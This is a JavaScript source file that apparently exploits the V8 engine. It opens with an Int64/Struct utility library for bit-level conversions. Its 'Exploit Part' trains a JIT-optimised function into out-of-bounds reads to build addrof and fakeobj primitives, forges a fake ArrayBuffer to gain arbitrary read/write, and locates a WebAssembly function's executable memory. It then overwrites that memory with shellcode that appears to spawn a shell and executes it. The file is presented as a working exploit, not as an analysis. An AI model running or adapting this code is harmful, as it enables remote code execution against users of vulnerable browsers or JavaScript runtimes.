
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Gro√ü
//

// Return the hexadecimal representation of the given byte.


function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function sub(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}
function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}




// Exploit Part

t_arr = [1.1,1.2,1.3];
t_arr2 = [{}];
function opt2(arr,idx){
  return arr[idx];
}

let ii = 0;
for(let i=0;i<10000000;i++)
  opt2(t_arr,0);
for(let i=0;i<10000000;i++)
  opt2(t_arr,0);
for(let i=0;i<10000000;i++);
  opt2(t_arr,0);

function addrof(obj){

  let tt_arr = [1.1,1.2,1.3];
  let tt_arr2 = [obj,obj,obj];
  //%DebugPrint(tt_arr);
  //%DebugPrint(tt_arr2);
  //%DebugPrint(obj);
  if(!trigger)
    ii = 0x10;  
  else
    ii = 0xb;
  return opt2(tt_arr,ii);
}

function fakeobj(addr){
  function opt(idx){
    arr[idx] = addr.asDouble();
  }
	let target = {};
  let arr = [1.1,1.2,1.3];//new Float64Array([1.1,1.2,1.3]);
  let arr2 = [target,target,target];
  let ii = 0 
  for(let i=0;i<10000000;i++)
    opt(ii);
  for(let i=0;i<10000000;i++)
    opt(ii);
  for(let i=0;i<10000000;i++)
    opt(ii);

  ii = 0x10;
  opt(ii);
  return arr2[0];
}

trigger =0;
let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;


let fake_arraybuffer = [
                // fake arraybuffer
                // map | prop
                u2d(0x41414141, 0x41414141), u2d(0, 0),
                // elem | size
                u2d(0, 0), u2d(0, 0x1000),
                // backing_store | 2
                u2d(0x41414141, 0x41414141), u2d(0x2, 0),
                u2d(0, 0), u2d(0, 0),

                // fake map
                u2d(0, 0), u2d(0x13080808, 0x19000423),
                u2d(0x82003ff, 0), u2d(0, 0),
                u2d(0, 0), u2d(0, 0),
                u2d(0, 0), u2d(0, 0),
].slice(0);

//var wasm_addr = addrof(f);
var fake_arraybuffer_addr = addrof(fake_arraybuffer);

//print(Int64.fromDouble(fake_arraybuffer_addr));
trigger = 1;

var wasm_addr = addrof(f);
//print(Int64.fromDouble(wasm_addr));
fake_arraybuffer[0] = Sub(Int64.fromDouble(fake_arraybuffer_addr), 0x40).asDouble();
fake_arraybuffer[4] = wasm_addr;

var fake = fakeobj(Sub(Int64.fromDouble(fake_arraybuffer_addr),0x80));
//%DebugPrint(fake);
let dv = new DataView(fake);
lo = dv.getUint32(0x18-1, true);
hi = dv.getUint32(0x18+4-1, true);

lo = lo - 0x181 + 0x1b*8;
fake_arraybuffer[4] = u2d(lo, hi);
lo = dv.getUint32(0, true);
hi = dv.getUint32(4, true);
fake_arraybuffer[4] = u2d(lo, hi);
//print(Int64.fromDouble(fake_arraybuffer[4]));
var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];
for(let i=0;i<shellcode.length;i++){
  dv.setUint32(i*4, shellcode[i], true);
}
f();
